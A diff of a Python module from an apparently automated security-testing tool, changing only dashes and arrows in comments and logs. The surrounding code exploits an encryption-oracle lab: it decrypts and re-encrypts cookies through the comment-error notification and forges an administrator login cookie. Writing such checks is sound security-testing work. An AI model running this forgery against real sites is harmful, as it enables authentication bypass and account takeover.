@@ -4,7 +4,7 @@ Encryption-oracle flow ("logic flaw that exposes an encryption oracle").
 The site persists logins in a `stay-logged-in` cookie = base64(encrypt("user:ts")).
 Posting a comment with an invalid email stores the error in a `notification` cookie
 = base64(encrypt("Invalid email address: " + email)) and then *displays the
-decrypted notification* — giving both an encryption oracle (attacker-controlled
+decrypted notification* - giving both an encryption oracle (attacker-controlled
 plaintext via the email field) and a decryption oracle (plaintext reflected back).
 
 Exploit: decrypt the stay-logged-in cookie to learn the "user:timestamp" format,
@@ -71,7 +71,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
         sc = dict(r.headers).get("set-cookie", "") if r else ""
         m = re.search(r"stay-logged-in=([^;]+)", sc)
         if not m:
-            logger.info("encryption-oracle: no stay-logged-in cookie — skipping")
+            logger.info("encryption-oracle: no stay-logged-in cookie - skipping")
             return []
         sl_ct = _b64d(m.group(1))
         steps.append(TestStep(step=1, description=f"login (stay-logged-in); ct {len(sl_ct)} bytes",
@@ -80,13 +80,13 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
         home = await c.request("GET", "/", follow_redirects=True)
         pm = re.search(r'postId=(\d+)', home.text if home else "")
         if not pm:
-            logger.info("encryption-oracle: no blog post / comment surface — skipping")
+            logger.info("encryption-oracle: no blog post / comment surface - skipping")
             return []
         post = f"/post?postId={pm.group(1)}"
         pid = pm.group(1)
 
         async def decrypt(ct: bytes):
-            # The lab intermittently 500s under load — retry the read a few times.
+            # The lab intermittently 500s under load - retry the read a few times.
             for _ in range(4):
                 c.set_auth(cookies={"notification": quote(_b64e(ct), safe="")})
                 pg = await c.request("GET", post, follow_redirects=True)
@@ -121,7 +121,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
         ct = await encrypt(("a" * pad) + target)
         forged = ct[drop * BS:]
         if not forged:
-            logger.info("encryption-oracle: encryption oracle returned nothing — skipping")
+            logger.info("encryption-oracle: encryption oracle returned nothing - skipping")
             return []
         steps.append(TestStep(step=3, description=f"forge admin cookie (pad {pad}, drop {drop} blocks)",
                               method="POST", path=comment_path))
@@ -161,7 +161,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
             vulnerability_class=VulnClass.FAITH_BASED_RULE,
             hypothesis=("Encryption oracle: the comment 'invalid email' error encrypts attacker "
                         "input and reflects the decryption, so the stay-logged-in cookie can be "
-                        f"forged to '{target}' via block-aligned prefix removal → admin takeover."),
+                        f"forged to '{target}' via block-aligned prefix removal -> admin takeover."),
             risk_rating=Severity.CRITICAL,
             affected_endpoint=f"POST {comment_path} (oracle) -> GET /admin",
             business_impact="Authentication bypass to administrator via a cryptographic oracle.",
